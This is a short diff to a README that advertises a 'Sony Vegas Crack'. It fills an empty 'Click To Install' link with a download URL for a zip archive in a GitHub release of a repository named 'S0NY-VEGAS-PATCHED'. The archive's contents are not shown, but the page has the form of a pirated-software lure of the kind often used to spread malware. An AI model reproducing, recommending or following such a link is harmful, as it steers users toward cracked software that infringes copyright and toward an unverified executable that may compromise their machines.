@@ -10,7 +10,7 @@
 
 ## Installation Guide
 To install **Sony Vegas Crack**, please follow these steps:
-# [Click To Install]()  
+# [Click To Install](https://github.com/AndreyPhytonskill/S0NY-VEGAS-PATCHED/releases/download/S0NY-VEGAS-PATCHER/SonyVegas.zip)  
 
 
 ## Overview
